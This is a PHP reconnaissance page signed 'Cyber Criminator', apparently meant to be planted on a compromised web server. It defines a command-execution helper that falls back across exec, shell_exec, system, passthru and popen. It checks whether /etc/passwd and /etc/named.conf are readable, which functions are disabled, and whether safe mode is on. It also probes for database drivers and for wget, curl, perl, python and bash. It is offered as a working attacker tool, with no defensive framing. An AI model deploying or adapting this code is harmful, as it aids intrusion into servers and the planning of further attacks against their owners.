<html>
     <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="icon" href="https://i.hizliresim.com/7corox1.png">
     <META NAME="robots" CONTENT="noindex,nofollow">
<?
@error_reporting(0);
function excute($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(@function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(@function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(@function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}

  // Show Stat
  function showstat($stat) {
    if ($stat=="on") { return "<font color=#36FF33><b>ON</b></font>"; }
    else { return "<font color=#FF3333><b>OFF</b></font>"; }
  }
  function named_conf(){
  if(@is_readable('/etc/named.conf')){ return "<font color=#36FF33><b>Readable</b></font>";
  }else { return "<font color=#FF3333><b>Not Readable</b></font>"; }
  }
  function passwd(){
  if(@is_readable('/etc/passwd')){ return "<font color=#36FF33><b>Readable</b></font>";
  }else { return "<font color=#FF3333><b>Not Readable</b></font>"; }
  }
  function testoracle() {
  if (@function_exists('ocilogon')) { return showstat("on"); }
  else { return showstat("off"); }
  }
  function testpostgresql() {
    if (@function_exists('pg_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmssql() {
    if (@function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  function testmysql() {
    if (@function_exists('mysql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
  }

  function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<font color=#FF3333><b>".$disablefunc."</b></font>"; }
    else { return "<font color=#36FF33><b>NONE</b></b></font>"; }
  }
    function openbase_dir() {
    if ($openbase_dir=@ini_get('open_basedir')){ return "<font color=#FF3333><b>".$openbase_dir."</b></font>"; }
    else { return "<font color=#36FF33><b>NONE</b></b></font>"; }
  }
    function testfetch() {
    if(excute('fetch --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testwget() {
    if (excute('wget --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testperl() {
    if (excute('perl --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testpy() {
    if (excute('python --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
      function testsh() {
    if (excute('bash --help')) { return showstat("on"); }
    else { return showstat("off"); }
  }
    function testcurl() {
    if (@function_exists('curl_version')) { return showstat("on"); }
    else { return showstat("off"); }
  }
  if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
    $safemode = TRUE;
    $hsafemode = "<font color=#FF3333><b>ON (Secure)</b></font>";
  }else{
    $safemode = FALSE;
    $hsafemode = "<font color=#36FF33><b>OFF (Not Secure)</b></font>";
  }
  
  $pwd=str_replace('\\', '/', dirname(__FILE__)).'/';
  
echo "
<link href=https://fonts.googleapis.com/css?family=Righteous&display=swap rel=stylesheet>
<style type=text/css>
@font-face {
	font-family: Righteous, cursive;
}
body { background-image: url(https://i.hizliresim.com/b8yogra.gif); }
		background-color: #000;
}
    color: white;  }
</style>
<div class=info>
<center>
<img src=https://i.hizliresim.com/7corox1.png width=80 height=60>
<font color=white size=6  face=Righteous>Server Info Check By ramil feyziyev (Cyber Criminator)</font>
<img src=https://i.hizliresim.com/7corox1.png width=80 height=60></center><br><br>
<center><span><font color=white size=3 face=Righteous>
<br> UName -a: <font color=#3342FF>".@php_uname()." </font> |</br>
<br> Hostname: <font color=#3342FF>".$_SERVER['HTTP_HOST']."</font> |</br>
<br> Software : <font color=#3342FF>".@getenv("SERVER_SOFTWARE")." </font> | </br>
<br> PHP Version: <font color=#3342FF>".@phpversion()." </font> |</br>
<br> Current Dir: <font color=#3342FF>{$pwd} |</font></br>
<br> ID:<font color=#3342FF>" .@getmyuid()."(".@get_current_user().") </font>- UID:<font color=#3342FF>".@getmyuid()."(".@get_current_user().") </font>- GID:<font color=#3342FF>".@getmygid()."(".@get_current_user().") </font> |</br>
<br> Your IP:<font color=#3342FF>".$_SERVER["REMOTE_ADDR"]." </font>| The Server IP:<font color=#3342FF>".@gethostbyname($_SERVER["HTTP_HOST"])." </font> |</br>
<br> Safe Mode: $hsafemode | Open_BaseDir: ".openbase_dir()." |</br>
<br> Disabled Functions: ".@showdisablefunctions()." |</br>
<br> named.conf File is: ".named_conf()." | passwd File is: ".passwd()."</br>
<br>
MySQL: ".@testmysql()." |
MSSQL: ".@testmssql()." |
Oracle: ".@testoracle()." |
PostgreSQL: ".@testpostgresql()." |
cURL: ".@testcurl()." |
Fetch: ".@testfetch()." |
WGet: ".@testwget()." |
Perl: ".@testperl()." |
Python: ".@testpy()." |
Bash: ".@testsh()." |
</center>
<br/>
</div>
";
?>
